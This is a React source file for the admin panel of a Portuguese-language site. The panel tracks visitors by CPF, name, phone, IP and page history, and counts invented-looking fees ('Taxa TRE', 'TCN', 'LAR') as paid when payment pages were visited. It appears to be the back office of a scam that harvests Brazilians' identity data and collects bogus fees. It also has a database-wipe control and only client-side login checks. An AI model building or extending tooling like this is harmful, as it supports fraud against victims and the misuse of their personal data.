import { useState, useEffect, useMemo } from 'react';
import { useQuery } from '@tanstack/react-query';
import { useLocation } from 'wouter';
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Table, TableBody, TableCaption, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { Skeleton } from "@/components/ui/skeleton";
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
import { Badge } from "@/components/ui/badge";
import { Dialog, DialogContent, DialogDescription, DialogFooter, DialogHeader, DialogTitle, DialogTrigger } from "@/components/ui/dialog";
import { Trash2, CheckCircle, Info, Search, ChevronRight, AlertTriangle, DollarSign, X, LogOut, Database, ShieldAlert } from "lucide-react";

// Interfaces para os dados da API
interface Visitante {
  id: number;
  cpf: string;
  nome?: string;
  telefone?: string;
  primeiro_acesso: string;
  ultimo_acesso: string;
  ip?: string;
  navegador?: string;
  sistema_operacional?: string;
}

interface PaginaVisitada {
  id: number;
  visitante_id: number;
  url: string;
  pagina: string;
  timestamp: string;
  referrer?: string;
  dispositivo?: string;
}

interface EstatisticaPagina {
  pagina: string;
  total: number;
}

// Interface para o status de pagamento
interface StatusPagamento {
  tre: boolean;
  tcn: boolean;
  lar: boolean;
  total: number;
}

export default function Admin() {
  const [activeTab, setActiveTab] = useState('visitantes');
  const [selectedVisitante, setSelectedVisitante] = useState<number | null>(null);
  const [searchCpf, setSearchCpf] = useState('');
  const [, setLocation] = useLocation();
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [dialogOpen, setDialogOpen] = useState(false);
  const [accessKey, setAccessKey] = useState('');
  const [isClearing, setIsClearing] = useState(false);
  const [clearResult, setClearResult] = useState<{success?: boolean, message?: string} | null>(null);

  // Verificar autenticação
  useEffect(() => {
    const checkAuth = () => {
      try {
        const authData = localStorage.getItem('adminAuth');
        if (!authData) {
          setIsAuthenticated(false);
          setLocation('/admin-login');
          return;
        }

        const auth = JSON.parse(authData);
        
        // Verificar se a autenticação está expirada (24 horas)
        const now = new Date().getTime();
        const authTime = auth.timestamp || 0;
        const authExpired = now - authTime > 24 * 60 * 60 * 1000;
        
        if (!auth.isAuthenticated || authExpired) {
          localStorage.removeItem('adminAuth');
          setIsAuthenticated(false);
          setLocation('/admin-login');
          return;
        }
        
        setIsAuthenticated(true);
      } catch (error) {
        console.error('Erro ao verificar autenticação:', error);
        setIsAuthenticated(false);
        setLocation('/admin-login');
      }
    };
    
    checkAuth();
  }, [setLocation]);

  // Função para fazer logout
  const handleLogout = () => {
    localStorage.removeItem('adminAuth');
    setIsAuthenticated(false);
    setLocation('/admin-login');
  };
  
  // Função para limpar o banco de dados
  const handleClearDatabase = async () => {
    if (!accessKey.trim()) {
      setClearResult({ 
        success: false, 
        message: 'A chave de acesso é obrigatória' 
      });
      return;
    }
    
    setIsClearing(true);
    setClearResult(null);
    
    try {
      const response = await fetch('/api/admin/limpar-dados', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ accessKey })
      });
      
      const data = await response.json();
      
      if (response.ok) {
        setClearResult({ 
          success: true, 
          message: data.message || 'Banco de dados limpo com sucesso' 
        });
        
        // Atualizar os dados após limpar o banco
        setTimeout(() => {
          refetchVisitantes();
          refetchPaginas();
          refetchEstatisticas();
        }, 1000);
        
        // Fechar diálogo após limpar com sucesso
        setTimeout(() => {
          setDialogOpen(false);
          setAccessKey('');
          setClearResult(null);
        }, 2000);
      } else {
        setClearResult({ 
          success: false, 
          message: data.message || 'Erro ao limpar banco de dados' 
        });
      }
    } catch (error) {
      console.error('Erro ao limpar banco:', error);
      setClearResult({ 
        success: false, 
        message: 'Erro ao processar solicitação' 
      });
    } finally {
      setIsClearing(false);
    }
  };

  // Consulta para obter todos os visitantes
  const {
    data: visitantes,
    isLoading: loadingVisitantes,
    error: visitantesError,
    refetch: refetchVisitantes
  } = useQuery({
    queryKey: ['/api/rastreamento/visitantes'],
    enabled: activeTab === 'visitantes'
  });

  // Consulta para obter páginas visitadas pelo visitante selecionado
  const {
    data: paginasVisitadas,
    isLoading: loadingPaginas,
    error: paginasError,
    refetch: refetchPaginas
  } = useQuery({
    queryKey: ['/api/rastreamento/visitante', selectedVisitante, 'paginas'],
    queryFn: async () => {
      if (!selectedVisitante) return null;
      const res = await fetch(`/api/rastreamento/visitante/${selectedVisitante}/paginas`);
      if (!res.ok) throw new Error('Erro ao buscar páginas visitadas');
      return res.json();
    },
    enabled: !!selectedVisitante
  });

  // Consulta para obter estatísticas de páginas
  const {
    data: estatisticas,
    isLoading: loadingEstatisticas,
    error: estatisticasError,
    refetch: refetchEstatisticas
  } = useQuery({
    queryKey: ['/api/rastreamento/estatisticas/paginas'],
    enabled: activeTab === 'estatisticas'
  });

  // Formatar CPF
  const formatarCpf = (cpf: string) => {
    if (!cpf) return '';
    return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
  };

  // Formatar data
  const formatarData = (dataString: string) => {
    if (!dataString) return '';
    const data = new Date(dataString);
    return data.toLocaleString('pt-BR');
  };

  // Função para filtrar visitantes pelo CPF
  const filtrarVisitantesPorCpf = () => {
    if (!visitantes || !Array.isArray(visitantes)) return [];
    
    if (!searchCpf.trim()) return visitantes;
    
    const cpfLimpo = searchCpf.replace(/\D/g, '');
    return visitantes.filter((v: Visitante) => 
      v.cpf.includes(cpfLimpo) || 
      (v.nome && v.nome.toLowerCase().includes(searchCpf.toLowerCase()))
    );
  };

  // Verifica o status de pagamento com base nas páginas visitadas
  const verificarStatusPagamento = (paginas: PaginaVisitada[]): StatusPagamento => {
    if (!paginas || !Array.isArray(paginas)) {
      return { tre: false, tcn: false, lar: false, total: 0 };
    }
    
    // URLs que indicam pagamentos realizados
    const urlsTRE = paginas.some(p => p.url.includes('/taxa-complementar'));
    const urlsTCN = paginas.some(p => p.url.includes('/taxa-lar'));
    const urlsLAR = paginas.some(p => p.url.includes('/sucesso'));
    
    // Cálculo do total gasto
    let total = 0;
    if (urlsTRE) total += 74.90; // Taxa TRE
    if (urlsTCN) total += 118.40; // Taxa TCN
    if (urlsLAR) total += 48.60; // Taxa LAR
    
    return {
      tre: urlsTRE,
      tcn: urlsTCN,
      lar: urlsLAR,
      total: total
    };
  };
  
  // Calcular totais de vendas baseado nas estatísticas
  const calcularTotalVendas = useMemo(() => {
    if (!estatisticas || !Array.isArray(estatisticas)) {
      return { trePagos: 0, tcnPagos: 0, larPagos: 0, totalVendas: 0 };
    }
    
    // Encontrar as estatísticas de pagina relevantes
    const taxaComplementar = estatisticas.find(e => e.pagina === '/taxa-complementar')?.total || 0;
    const taxaLar = estatisticas.find(e => e.pagina === '/taxa-lar')?.total || 0;
    const sucesso = estatisticas.find(e => e.pagina === '/sucesso')?.total || 0;
    
    // Calcular valores
    const trePagos = taxaComplementar;
    const tcnPagos = taxaLar;
    const larPagos = sucesso;
    
    // Calcular total de vendas
    const totalVendas = (trePagos * 74.90) + (tcnPagos * 118.40) + (larPagos * 48.60);
    
    return { trePagos, tcnPagos, larPagos, totalVendas };
  }, [estatisticas]);

  // Atualizar os dados ao mudar de tab
  useEffect(() => {
    if (activeTab === 'visitantes') {
      refetchVisitantes();
    } else if (activeTab === 'estatisticas') {
      refetchEstatisticas();
    }
    
    // Limpar seleção ao mudar de tab
    setSelectedVisitante(null);
  }, [activeTab, refetchVisitantes, refetchEstatisticas]);

  // Efeito para buscar páginas quando um visitante é selecionado
  useEffect(() => {
    if (selectedVisitante) {
      refetchPaginas();
    }
  }, [selectedVisitante, refetchPaginas]);

  return (
    <div className="container mx-auto py-10 px-4">
      <Card className="mb-8">
        <CardHeader className="bg-blue-50 border-b">
          <CardTitle className="text-2xl font-bold text-blue-900">
            Painel Administrativo
          </CardTitle>
          <CardDescription>
            Visualize dados de rastreamento de usuários e estatísticas
          </CardDescription>
        </CardHeader>
        <CardContent className="p-6">
          <Tabs
            defaultValue="visitantes"
            value={activeTab}
            onValueChange={setActiveTab}
            className="w-full"
          >
            <TabsList className="mb-6 grid grid-cols-2 md:w-[400px]">
              <TabsTrigger value="visitantes">Visitantes</TabsTrigger>
              <TabsTrigger value="estatisticas">Estatísticas</TabsTrigger>
            </TabsList>
            
            {/* Tab de Visitantes */}
            <TabsContent value="visitantes" className="space-y-4">
              <div className="flex flex-col md:flex-row gap-4 mb-6">
                <div className="relative flex-1">
                  <Input
                    placeholder="Buscar por CPF ou nome"
                    value={searchCpf}
                    onChange={(e) => setSearchCpf(e.target.value)}
                    className="pr-10"
                  />
                  <Search className="absolute right-3 top-2.5 h-5 w-5 text-gray-400" />
                </div>
                <Button
                  onClick={() => refetchVisitantes()}
                  variant="outline"
                >
                  Atualizar
                </Button>
              </div>
              
              {loadingVisitantes ? (
                <div className="space-y-2">
                  {[...Array(5)].map((_, i) => (
                    <Skeleton key={i} className="h-12 w-full" />
                  ))}
                </div>
              ) : visitantesError ? (
                <Alert variant="destructive">
                  <AlertTitle>Erro ao carregar visitantes</AlertTitle>
                  <AlertDescription>
                    Ocorreu um erro ao buscar os dados. Tente novamente.
                  </AlertDescription>
                </Alert>
              ) : !visitantes || !Array.isArray(visitantes) || visitantes.length === 0 ? (
                <Alert>
                  <Info className="h-4 w-4" />
                  <AlertTitle>Nenhum visitante encontrado</AlertTitle>
                  <AlertDescription>
                    Não há visitantes registrados no sistema.
                  </AlertDescription>
                </Alert>
              ) : (
                <div className="overflow-x-auto">
                  <Table>
                    <TableCaption>Lista de visitantes rastreados</TableCaption>
                    <TableHeader>
                      <TableRow>
                        <TableHead>CPF</TableHead>
                        <TableHead>Nome</TableHead>
                        <TableHead>Telefone</TableHead>
                        <TableHead>Primeiro Acesso</TableHead>
                        <TableHead>Último Acesso</TableHead>
                        <TableHead>Ações</TableHead>
                      </TableRow>
                    </TableHeader>
                    <TableBody>
                      {filtrarVisitantesPorCpf().map((visitante: Visitante) => (
                        <TableRow 
                          key={visitante.id}
                          className={
                            selectedVisitante === visitante.id
                              ? "bg-blue-50"
                              : undefined
                          }
                        >
                          <TableCell>{formatarCpf(visitante.cpf)}</TableCell>
                          <TableCell>{visitante.nome || 'N/A'}</TableCell>
                          <TableCell>{visitante.telefone || 'N/A'}</TableCell>
                          <TableCell>{formatarData(visitante.primeiro_acesso)}</TableCell>
                          <TableCell>{formatarData(visitante.ultimo_acesso)}</TableCell>
                          <TableCell>
                            <Button
                              size="sm"
                              onClick={() => setSelectedVisitante(
                                selectedVisitante === visitante.id ? null : visitante.id
                              )}
                              variant={selectedVisitante === visitante.id ? "default" : "outline"}
                            >
                              {selectedVisitante === visitante.id ? "Fechar" : "Ver Detalhes"}
                            </Button>
                          </TableCell>
                        </TableRow>
                      ))}
                    </TableBody>
                  </Table>
                </div>
              )}
              
              {/* Detalhes do visitante selecionado */}
              {selectedVisitante && (
                <>
                  {/* Card de Pagamentos */}
                  {!loadingPaginas && !paginasError && paginasVisitadas && Array.isArray(paginasVisitadas) && paginasVisitadas.length > 0 && (
                    <Card className="mt-8 mb-8">
                      <CardHeader className="bg-green-50">
                        <CardTitle className="text-lg flex items-center">
                          <DollarSign className="h-5 w-5 mr-2 text-green-600" />
                          Status de Pagamentos
                        </CardTitle>
                        <CardDescription>
                          Status de pagamento das taxas para o visitante selecionado
                        </CardDescription>
                      </CardHeader>
                      <CardContent className="p-4">
                        {/* Calcular o status de pagamento baseado nas páginas visitadas */}
                        {(() => {
                          const statusPagamento = verificarStatusPagamento(paginasVisitadas);
                          return (
                            <div className="space-y-6">
                              <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                                {/* Taxa TRE */}
                                <div className={`p-4 rounded-lg border ${statusPagamento.tre ? 'bg-green-50 border-green-200' : 'bg-red-50 border-red-200'}`}>
                                  <div className="flex justify-between items-center mb-2">
                                    <h3 className="text-sm font-medium">Taxa TRE</h3>
                                    <Badge variant={statusPagamento.tre ? "default" : "destructive"}>
                                      {statusPagamento.tre ? "PAGO" : "NÃO PAGO"}
                                    </Badge>
                                  </div>
                                  <p className="text-xl font-bold">R$ 74,90</p>
                                  <p className="text-xs text-gray-500 mt-1">
                                    {statusPagamento.tre 
                                      ? "Acesso à página /taxa-complementar detectado" 
                                      : "Nenhum acesso à página /taxa-complementar"}
                                  </p>
                                </div>
                                
                                {/* Taxa TCN */}
                                <div className={`p-4 rounded-lg border ${statusPagamento.tcn ? 'bg-green-50 border-green-200' : 'bg-red-50 border-red-200'}`}>
                                  <div className="flex justify-between items-center mb-2">
                                    <h3 className="text-sm font-medium">Taxa TCN</h3>
                                    <Badge variant={statusPagamento.tcn ? "default" : "destructive"}>
                                      {statusPagamento.tcn ? "PAGO" : "NÃO PAGO"}
                                    </Badge>
                                  </div>
                                  <p className="text-xl font-bold">R$ 118,40</p>
                                  <p className="text-xs text-gray-500 mt-1">
                                    {statusPagamento.tcn 
                                      ? "Acesso à página /taxa-lar detectado" 
                                      : "Nenhum acesso à página /taxa-lar"}
                                  </p>
                                </div>
                                
                                {/* Taxa LAR */}
                                <div className={`p-4 rounded-lg border ${statusPagamento.lar ? 'bg-green-50 border-green-200' : 'bg-red-50 border-red-200'}`}>
                                  <div className="flex justify-between items-center mb-2">
                                    <h3 className="text-sm font-medium">Taxa LAR</h3>
                                    <Badge variant={statusPagamento.lar ? "default" : "destructive"}>
                                      {statusPagamento.lar ? "PAGO" : "NÃO PAGO"}
                                    </Badge>
                                  </div>
                                  <p className="text-xl font-bold">R$ 48,60</p>
                                  <p className="text-xs text-gray-500 mt-1">
                                    {statusPagamento.lar 
                                      ? "Acesso à página /sucesso detectado" 
                                      : "Nenhum acesso à página /sucesso"}
                                  </p>
                                </div>
                              </div>
                              
                              {/* Total Gasto */}
                              <div className="mt-4 p-4 bg-blue-50 rounded-lg border border-blue-200">
                                <h3 className="text-lg font-semibold mb-2">Total Gasto</h3>
                                <p className="text-3xl font-bold text-blue-700">
                                  R$ {statusPagamento.total.toFixed(2).replace('.', ',')}
                                </p>
                                <p className="text-sm text-gray-600 mt-1">
                                  {statusPagamento.total > 0 
                                    ? `${statusPagamento.tre ? 'TRE' : ''}${statusPagamento.tre && (statusPagamento.tcn || statusPagamento.lar) ? ' + ' : ''}${statusPagamento.tcn ? 'TCN' : ''}${(statusPagamento.tre || statusPagamento.tcn) && statusPagamento.lar ? ' + ' : ''}${statusPagamento.lar ? 'LAR' : ''}`
                                    : 'Nenhum pagamento detectado'}
                                </p>
                              </div>
                            </div>
                          );
                        })()}
                      </CardContent>
                    </Card>
                  )}

                  {/* Card de Páginas Visitadas */}
                  <Card className="mt-8">
                    <CardHeader className="bg-gray-50">
                      <CardTitle className="text-lg">
                        Páginas Visitadas
                      </CardTitle>
                      <CardDescription>
                        Histórico de navegação do visitante selecionado
                      </CardDescription>
                    </CardHeader>
                    <CardContent className="p-4">
                      {loadingPaginas ? (
                        <div className="space-y-2">
                          {[...Array(3)].map((_, i) => (
                            <Skeleton key={i} className="h-10 w-full" />
                          ))}
                        </div>
                      ) : paginasError ? (
                        <Alert variant="destructive">
                          <AlertTitle>Erro ao carregar histórico</AlertTitle>
                          <AlertDescription>
                            Ocorreu um erro ao buscar o histórico de navegação.
                          </AlertDescription>
                        </Alert>
                      ) : !paginasVisitadas || !Array.isArray(paginasVisitadas) || paginasVisitadas.length === 0 ? (
                        <Alert>
                          <Info className="h-4 w-4" />
                          <AlertTitle>Nenhuma página visitada</AlertTitle>
                          <AlertDescription>
                            Este visitante ainda não acessou nenhuma página.
                          </AlertDescription>
                        </Alert>
                      ) : (
                        <div className="overflow-x-auto">
                          <Table>
                            <TableHeader>
                              <TableRow>
                                <TableHead>Página</TableHead>
                                <TableHead>URL</TableHead>
                                <TableHead>Data/Hora</TableHead>
                                <TableHead>Dispositivo</TableHead>
                                <TableHead>Referrer</TableHead>
                              </TableRow>
                            </TableHeader>
                            <TableBody>
                              {paginasVisitadas.map((pagina: PaginaVisitada) => (
                                <TableRow key={pagina.id}>
                                  <TableCell className="font-medium">{pagina.url}</TableCell>
                                  <TableCell className="text-sm truncate max-w-[200px]">{pagina.url}</TableCell>
                                  <TableCell>{formatarData(pagina.timestamp)}</TableCell>
                                  <TableCell>{pagina.dispositivo || 'N/A'}</TableCell>
                                  <TableCell className="text-sm truncate max-w-[200px]">{pagina.referrer || 'N/A'}</TableCell>
                                </TableRow>
                              ))}
                            </TableBody>
                          </Table>
                        </div>
                      )}
                    </CardContent>
                  </Card>
                </>
              )}
            </TabsContent>
            
            {/* Tab de Estatísticas */}
            <TabsContent value="estatisticas" className="space-y-8">
              {/* Card de resumo financeiro */}
              <Card>
                <CardHeader className="bg-green-50 border-b">
                  <CardTitle className="text-lg flex items-center">
                    <DollarSign className="h-5 w-5 mr-2 text-green-600" />
                    Resumo de Vendas
                  </CardTitle>
                  <CardDescription>
                    Resumo financeiro baseado nos acessos às páginas de pagamento
                  </CardDescription>
                </CardHeader>
                <CardContent className="p-6">
                  {loadingEstatisticas ? (
                    <div className="space-y-2">
                      {[...Array(3)].map((_, i) => (
                        <Skeleton key={i} className="h-10 w-full" />
                      ))}
                    </div>
                  ) : estatisticasError ? (
                    <Alert variant="destructive">
                      <AlertTitle>Erro ao carregar estatísticas financeiras</AlertTitle>
                      <AlertDescription>
                        Ocorreu um erro ao calcular os dados financeiros.
                      </AlertDescription>
                    </Alert>
                  ) : !estatisticas || !Array.isArray(estatisticas) ? (
                    <Alert>
                      <Info className="h-4 w-4" />
                      <AlertTitle>Nenhuma estatística disponível</AlertTitle>
                      <AlertDescription>
                        Não há dados financeiros registrados.
                      </AlertDescription>
                    </Alert>
                  ) : (
                    <div className="grid grid-cols-1 md:grid-cols-4 gap-6">
                      {/* Resumo TRE */}
                      <div className="p-4 rounded-lg border bg-blue-50 border-blue-200">
                        <h3 className="text-sm font-medium text-blue-800 mb-2">Taxa TRE (R$ 74,90)</h3>
                        <div className="flex items-end justify-between">
                          <div>
                            <p className="text-3xl font-bold text-blue-900">
                              {calcularTotalVendas.trePagos}
                            </p>
                            <p className="text-sm text-blue-600">Unidades</p>
                          </div>
                          <p className="text-lg font-semibold text-blue-700">
                            R$ {(calcularTotalVendas.trePagos * 74.9).toFixed(2).replace('.', ',')}
                          </p>
                        </div>
                      </div>

                      {/* Resumo TCN */}
                      <div className="p-4 rounded-lg border bg-indigo-50 border-indigo-200">
                        <h3 className="text-sm font-medium text-indigo-800 mb-2">Taxa TCN (R$ 118,40)</h3>
                        <div className="flex items-end justify-between">
                          <div>
                            <p className="text-3xl font-bold text-indigo-900">
                              {calcularTotalVendas.tcnPagos}
                            </p>
                            <p className="text-sm text-indigo-600">Unidades</p>
                          </div>
                          <p className="text-lg font-semibold text-indigo-700">
                            R$ {(calcularTotalVendas.tcnPagos * 118.4).toFixed(2).replace('.', ',')}
                          </p>
                        </div>
                      </div>

                      {/* Resumo LAR */}
                      <div className="p-4 rounded-lg border bg-purple-50 border-purple-200">
                        <h3 className="text-sm font-medium text-purple-800 mb-2">Taxa LAR (R$ 48,60)</h3>
                        <div className="flex items-end justify-between">
                          <div>
                            <p className="text-3xl font-bold text-purple-900">
                              {calcularTotalVendas.larPagos}
                            </p>
                            <p className="text-sm text-purple-600">Unidades</p>
                          </div>
                          <p className="text-lg font-semibold text-purple-700">
                            R$ {(calcularTotalVendas.larPagos * 48.6).toFixed(2).replace('.', ',')}
                          </p>
                        </div>
                      </div>

                      {/* Total de vendas */}
                      <div className="p-4 rounded-lg border bg-green-50 border-green-200">
                        <h3 className="text-sm font-medium text-green-800 mb-2">Total de Vendas</h3>
                        <div className="flex items-end justify-between">
                          <div>
                            <p className="text-3xl font-bold text-green-900">
                              {calcularTotalVendas.trePagos + calcularTotalVendas.tcnPagos + calcularTotalVendas.larPagos}
                            </p>
                            <p className="text-sm text-green-600">Transações</p>
                          </div>
                          <p className="text-lg font-semibold text-green-700">
                            R$ {calcularTotalVendas.totalVendas.toFixed(2).replace('.', ',')}
                          </p>
                        </div>
                      </div>
                    </div>
                  )}
                </CardContent>
              </Card>

              {/* Card de estatísticas de visualização */}
              <Card>
                <CardHeader className="bg-gray-50">
                  <CardTitle className="text-lg">
                    Estatísticas de Visualização de Páginas
                  </CardTitle>
                  <CardDescription>
                    Total de visualizações por página
                  </CardDescription>
                </CardHeader>
                <CardContent className="p-4">
                  {loadingEstatisticas ? (
                    <div className="space-y-2">
                      {[...Array(5)].map((_, i) => (
                        <Skeleton key={i} className="h-10 w-full" />
                      ))}
                    </div>
                  ) : estatisticasError ? (
                    <Alert variant="destructive">
                      <AlertTitle>Erro ao carregar estatísticas</AlertTitle>
                      <AlertDescription>
                        Ocorreu um erro ao buscar os dados. Tente novamente.
                      </AlertDescription>
                    </Alert>
                  ) : !estatisticas || !Array.isArray(estatisticas) || estatisticas.length === 0 ? (
                    <Alert>
                      <Info className="h-4 w-4" />
                      <AlertTitle>Nenhuma estatística disponível</AlertTitle>
                      <AlertDescription>
                        Não há dados de visualização de páginas registrados.
                      </AlertDescription>
                    </Alert>
                  ) : (
                    <div className="overflow-x-auto">
                      <Table>
                        <TableCaption>Total de visualizações por página</TableCaption>
                        <TableHeader>
                          <TableRow>
                            <TableHead>Página</TableHead>
                            <TableHead className="text-right">Total de Visualizações</TableHead>
                          </TableRow>
                        </TableHeader>
                        <TableBody>
                          {estatisticas.map((estatistica: EstatisticaPagina, index: number) => (
                            <TableRow key={index}>
                              <TableCell className="font-medium">{estatistica.pagina}</TableCell>
                              <TableCell className="text-right">{estatistica.total}</TableCell>
                            </TableRow>
                          ))}
                        </TableBody>
                      </Table>
                    </div>
                  )}
                </CardContent>
              </Card>
            </TabsContent>
          </Tabs>
        </CardContent>
      </Card>
    </div>
  );
}